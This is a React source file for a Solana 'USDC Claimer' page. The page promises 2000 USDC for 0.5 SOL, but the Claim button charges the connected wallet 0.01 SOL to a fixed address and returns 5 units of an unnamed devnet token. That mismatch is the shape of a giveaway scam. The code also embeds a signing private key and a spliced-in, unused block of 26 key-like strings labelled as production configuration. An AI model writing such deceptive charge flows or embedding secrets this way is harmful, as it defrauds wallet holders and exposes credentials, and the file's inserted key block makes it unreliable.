/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "48hy7bQ8d4p9hiLCLXDsCoWKmZgwn2URXqu59hxPJjB7WLsyRdYajZTwMXnh4ULFk8983n8b8e9sUVatSfENoaSs"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4uXzxWn6wtvBUATfVVWGbAzZ5tzYJcZPNQjzpeuwveqhTZbNXVb4QvsSom5cGXh9PmWGg38fheXx95LE9xZ3UvRR",
  "key1": "Hn1gUe8Uyux2FA8HiTW8AiYqJX9F8aATMfZ54bJmxQsFZ5gZ4GfGYDttNEw92jKVogWAKJthdztQsZkaAPpYx9x",
  "key2": "41cEu5vbSgzk8FSzDmXLWHmzTuE7usS9rAbpLstJiU2zmQwFkpseSRA2QxEbVq6TdA4ekdqwR9Sbm1GmHDHyQDYX",
  "key3": "4Dpzsy2Q1Rv5g47ncqtAYnpsh7nBkN1YhGYzkwtVUBdZfRJ1eBH5kR3jzatKmA5qLTrdusG1RewWHwv31wQRpvtf",
  "key4": "24w5qgejqXtFjEtQzw55aNQrFPJDKAypz22pHULDZf7FP6wyED3hV5MnT2gptPt3P25QknUCH9RDHKGtZWigG8FS",
  "key5": "31mLtZiWvzjRR8p3t4ZmPKdVsyWEsXTne8DPMzvK7He4NzK2vKsuzF8tNbcckHCZyzVFk2qc8tTXCoUFECDuXXWc",
  "key6": "7dFGWG5UzuTCmojZTo3a9NmBQ6fUGjzobizDDUXBFedajG44SBbtA3PHnFPim9zU7ArpZ8ECuCQqxCpcDsgMCwo",
  "key7": "4kBi8FooigeCudUC6Zs1yw8EMSGHkbLDscsKAV2BPXhy8aB2qRhqrbLLF5iAe5VXCR3tqRgnoji3TR5mycpjEBpe",
  "key8": "YibTHUB2Ls16jUBe3znDLV6gSwxGrzkeR3PgjDJhCL8GydYm33sZCnfUbocRY2oQFKbFea91sphEveVedH89UqW",
  "key9": "5bywjiehECDnPsXWP2KR8jdWK9eWLf7GW2hMt3cidDFVeyqdKzZceJJVLQHwsSoJRjhwLenRfjppwpdmo5yJBNFj",
  "key10": "5Yj8bvFhsM8z7wKuvUyZJS2mMcrcqd79YdqimdaPuxUKKFziT6vS4jnKyNgLrwtxHRzXgox8SY61QmfKfKnDiNup",
  "key11": "2HNscyC6rXrT8qk57r3icnABHRvdaS2ifq8RnSBNUgLgwzhTvxkFwFSyrZ57jBHPV1HazvXKp6AS6WJcvuNGm1ez",
  "key12": "xq8TLYKWa3WWtRoJGUcCvgMqPfxvU4arDoE4T1guKYRvcEnr2128MqkExFHBi71nvQPd1pfb3FYYmtcNUYvR7xg",
  "key13": "4oRY6vTHmgV9tcsTvXBY68zVwgPaEFHxQAkYff3Ju6U53CpAmqbtad1NfiXWpaJjWqERvgDmxthL2vXFLBJyHfCe",
  "key14": "3ghuykZ3BwQZFgyUDZ4hhYLp8uDLiLT8wykRLRGwJYGkKkNKt1K5R4sSQrRvnnFDKH4U9zMvEazdJ1SPfLyyHgKz",
  "key15": "4RqCytf1BfRAr9BSvZyCYaAH2WMvid4qqpbqwPRtLrikwLgUWmb7tUqF5eCQnHTfzuPsJqkJRkcU8cjxbohrzYJT",
  "key16": "3YYpvYoVGCrYMFTDHFEN1CVzmHA5XhkZvKsyT5UCckRMjiF3bbJZ1UWtsVPWA4LCPbGgD8pUdGoCD9Mw1W6Kvtwb",
  "key17": "vnTytTTkSGouD2VL5QM1UTjJCrn7jx4CqAw76wysQeunbrhtYNaejNuBFwHBfAiuCtX9xjHbkgZ1Rh4JQL8gTLK",
  "key18": "25MBbjjQVaDdNG4m8MX2CM3CjbSTKt9M2vrbVUDDUC3iEAj8vemEr9GALZTK9AhcenwBio8EChUnVXGdi4NEPXnZ",
  "key19": "44VPU7RWN535bxdxtmavsTuZKT2xrEgKox3z7oR6NPnGbEndVcUnyauYAkCgJFrWGwJmXvvQCurY9oQtquaqwFHT",
  "key20": "3fVzPjha2uvSbcS7gK663fjcc5Td1gLNYoDZHunZgNMWw3kdUxVtjSnRgB6XCuz8bzBsGrzkT9SvLqpjEjTwuSFx",
  "key21": "59fd7FoqBJ65qXBek3KUdwt8z2T2SABXL4WK7XHRswqRnW4HhFtGwL49PS5dvtSHwGeDnkGVMt2vqrH1jj9VxhHF",
  "key22": "43XKAjzQ1M8emTW9mHd8p5zNmhbMewJ15796xJg9vMchcMPb4o2HpieYbVe8D2csLR6zX1Ei1qE8DUNnmRSc5pV",
  "key23": "2udLkJz9rpwuR8b92vaH9viQJzGzzpNi5Y91aPguAcSswUZaU3mU1D6k9xE93FfhRcPPtiNFbzTNgT2NsGyTrKRM",
  "key24": "34EM7sBNt2Eg8HBSX94vDJZMY7TR22kGUVSXKjvbFE65w8ytDDFWos2cL2mNyimoUqeTySkTqpY4LTbSSYA8oibo",
  "key25": "yy18CWaaHBHzREZwcxqDw8tQjsAuo9PhWgDebYiC11fs4NNuBAmaWK4z4eqCr19tr8EwKqgDJ79fZPZHhr8tzYF"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
